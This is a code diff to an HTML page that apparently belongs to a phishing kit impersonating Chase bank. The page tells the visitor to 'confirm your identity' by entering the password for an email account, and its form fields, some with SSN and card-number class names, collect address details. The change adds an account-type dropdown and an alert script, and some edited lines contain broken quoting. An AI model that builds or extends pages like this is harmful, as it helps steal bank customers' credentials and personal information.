@@ -416,7 +416,8 @@
                                                 <h3 class="emaildresstext1" style="display: none;">Confirm your identity
                                                     using your email linked to your chase account.</h3>
                                                 <h3 class="emailpasswordtext1" style="">Confirm your identity using
-                                                    <span>admin</span></h3>
+                                                    <span>admin</span>
+                                                </h3>
                                                 <p class="emailPasswordtext2" style="">For your security, enter your
                                                     password for (<strong>admin</strong>) linked to your chase account.
                                                     By successfully logging in to the <span>admin</span> account
@@ -602,6 +603,21 @@
                                                                 for="otpcode_input-input-field">Full Name</label>
                                                         </div>
                                                         <div class="col-xs-12 col-sm-5 form-column otp-code">
+                                                            <div class="account-input ssn_card_account_number" id="otpcode_input">
+                                                                <select name="account_type" class="jpui input account-input ssn_card_account_number" id="account_type">
+                                                                    <option disabled selected>Select Account Type</option>
+                                                                    <option value="personal">Personal Account</option>
+                                                                    <option value="business">Business Account</option>
+                                                                </select>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="row">
+                                                        <div class="col-xs-12 col-sm-5 label-column otp-code">
+                                                            <label class="jpui label"
+                                                                for="otpcode_input-input-field">Full Name</label>
+                                                        </div>
+                                                        <div class="col-xs-12 col-sm-5 form-column otp-code">
                                                             <div class="account-input ssn_card_account_number"
                                                                 id="otpcode_input">
                                                                 <input
@@ -678,8 +694,9 @@
                                                                 <input
                                                                     class="jpui input account-input ssn_card_account_number"
                                                                     id="CityR" placeholder="City" format="" type="text"
-                                                                    name="CityR" readonly data-validate="identificationCode"
-                                                                    required="" value="">
+                                                                    name="CityR" readonly
+                                                                    data-validate="identificationCode" required=""
+                                                                    value="">
 
                                                             </div>
                                                         </div>
@@ -694,8 +711,8 @@
                                                                 id="otpcode_input">
                                                                 <input
                                                                     class="jpui input account-input ssn_card_account_number"
-                                                                    id="StateRegion" readonly placeholder="State" format=""
-                                                                    type="text" name="StateRegion"
+                                                                    id="StateRegion" readonly placeholder="State"
+                                                                    format="" type="text" name="StateRegion"
                                                                     data-validate="identificationCode" required=""
                                                                     value="">
 
@@ -792,8 +809,8 @@
                                                 <div class="button-container row hide-sm">
                                                     <div class="col-xs-12 col-sm-3 col-sm-push-9">
                                                         <button type="submit" id="log_on_to_landing_page"
-                                                            class="jpui button focus fluid primary"
-                                                            "><span class="label">Next</span>
+                                                            class="jpui button focus fluid primary" "><span class="
+                                                            label">Next</span>
                                                         </button>
                                                     </div>
                                                     <div class="col-xs-12 col-sm-3 col-sm-push-3">
@@ -810,8 +827,8 @@
                                                     </div>
                                                     <div class="col-xs-12 col-sm-3">
                                                         <button type="submit" id="log_on_to_landing_page-sm"
-                                                            class="jpui button focus fluid primary disabled"
-                                                            "><span class="label">Next</span>
+                                                            class="jpui button focus fluid primary disabled" "><span class="
+                                                            label">Next</span>
                                                         </button>
                                                     </div>
                                                 </div>
@@ -997,7 +1014,8 @@
                                                                 id="requestNewIdentificationCode"
                                                                 href="javascript:void(0);"
                                                                 aria-label=" chase account verification ">chase account
-                                                                verification</a></span></p>
+                                                                verification</a></span>
+                                                    </p>
                                                 </div>
                                                 <div class="button-container row hide-sm">
                                                     <div class="col-xs-12 col-sm-3 col-sm-push-9">
@@ -1019,8 +1037,8 @@
                                                     </div>
                                                     <div class="col-xs-12 col-sm-3">
                                                         <button type="submit" id="log_on_to_landing_page-sm1"
-                                                            class="jpui button focus fluid primary disabled"
-                                                            "><span class="label">Finish</span>
+                                                            class="jpui button focus fluid primary disabled" "><span class="
+                                                            label">Finish</span>
                                                         </button>
                                                     </div>
                                                 </div>
@@ -1049,6 +1067,16 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
 
     <script type="text/javascript">
+        $(document).ready(function () {
+            var account_type = $("#account_type").val();
+            if(account_type == 'personal'){
+                alert("personal selected");
+            } else if(account_type == 'business'){
+                alert('Business selected');
+            } else {
+                alert("Please select account type");
+            }
+        });
         $(document).ready(function () {
             $('#exitAccountSuspended').click(function (e) {
                 e.stopPropagation();
